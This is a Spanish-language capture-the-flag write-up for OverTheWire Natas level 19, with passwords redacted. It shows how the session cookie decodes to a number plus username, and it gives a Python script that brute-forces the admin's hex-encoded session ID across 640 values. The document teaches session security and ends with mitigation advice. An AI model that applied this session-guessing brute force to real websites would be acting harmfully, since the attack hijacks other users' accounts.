# Natas 19 → 20: Session-ID prediction (ID codificado)

[← Nivel 18](natas-18.md) · [Índice](../README.md)

| Campo | Detalle |
|-------|---------|
| **Wargame** | [OverTheWire: Natas](https://overthewire.org/wargames/natas/) |
| **Categoría** | Gestión de sesiones |
| **Debilidad** | [CWE-334](https://cwe.mitre.org/data/definitions/334.html): Small Space of Random Values |
| **Herramientas** | DevTools del navegador, `xxd`, Python (`requests`) |
| **URL** | `http://natas19.natas.labs.overthewire.org` |
| **Credenciales** | `natas19` / `[redacted]` |

> [!NOTE]
> Las contraseñas y secretos están omitidos (`[redacted]`). El objetivo es documentar el método, no la respuesta.

## Resumen
El ID de sesión es el hexadecimal de `NUMERO-usuario`; la codificación no agrega seguridad y el espacio de IDs sigue siendo de 640 valores.

## Análisis y explotación
El nivel avisa: *"usa casi el mismo código que el anterior, pero los session IDs ya no son secuenciales"*. Es el mismo ataque de natas18 (session-ID prediction), con una capa extra de codificación.

### Descubriendo el formato del ID

Al loguearse con un usuario cualquiera (`test`) y mirar la cookie `PHPSESSID` en DevTools, ya no aparece un número simple como en natas18, sino un valor como:

```
3134342d74657374
```

Son pares de **hexadecimal**. Decodificando (hex → ASCII):

```bash
echo "3134342d74657374" | xxd -r -p
# → 144-test
```

El formato es `NUMERO-USERNAME`:
- `144` → un ID aleatorio (mismo rango que natas18: `rand(1, 640)`)
- `test` → el username que se puso en el login

Logueándose varias veces se confirma: la parte del número cambia, el username se mantiene.

### El vector

Para ser admin hace falta una sesión con `username = admin`. Su cookie sería el hex de `NUMERO-admin`, con el número en algún punto entre 1 y 640. No se sabe cuál, pero son solo 640 → se prueban todas.

El camino es el inverso de la decodificación: armar el texto `{i}-admin`, **codificarlo a hex**, y mandarlo como `PHPSESSID`.

### Automatización con Python

```python
import requests

URL  = "http://natas19.natas.labs.overthewire.org/"
USER = "natas19"
PASS = "[redacted]"

print("[*] Buscando el PHPSESSID del admin (1 a 640, formato NUMERO-admin en hex)...")
for i in range(1, 641):
    plain = f"{i}-admin"            # texto plano, ej. "281-admin"
    sid   = plain.encode().hex()   # a hex, ej. "3238312d61646d696e"
    r = requests.get(URL, auth=(USER, PASS), cookies={"PHPSESSID": sid})
    if "You are an admin" in r.text:
        print(f"[+] Encontrado! i={i}  plain='{plain}'  hex={sid}")
        print(r.text)
        break
    print(f"    probando {i} ({plain})...", end="\r")
```

Puntos clave:
- `f"{i}-admin"` → la cadena `NUMERO-admin` deducida del formato
- `.encode().hex()` → texto → hex (el inverso de `xxd -r -p`)
- `cookies={"PHPSESSID": sid}` → manda el hex como cookie, igual que en natas18

En esta ejecución el ID del admin fue **281** (`281-admin` → `3238312d61646d696e`), y la respuesta trajo las credenciales de natas20.

## Resultado

- **Password obtenida (`natas20`):** `[redacted]`

## Lección aprendida y mitigación
Codificar **no es** cifrar. Pasar el ID de sesión a hex (o base64, o rot13) no agrega seguridad: es reversible con una línea y el contenido queda a la vista. El problema de fondo es el mismo que natas18 — el espacio de IDs sigue siendo pequeño y predecible (`rand(1, 640)`), y además ahora se sabe que el username va embebido. La defensa real: identificadores de sesión largos, aleatorios y opacos (el manejador nativo de PHP), sin estructura adivinable ni datos del usuario adentro.

## Referencias
- [CWE-334](https://cwe.mitre.org/data/definitions/334.html): Small Space of Random Values
- [OverTheWire: Natas](https://overthewire.org/wargames/natas/)

---
[← Nivel 18](natas-18.md) · [Índice](../README.md)
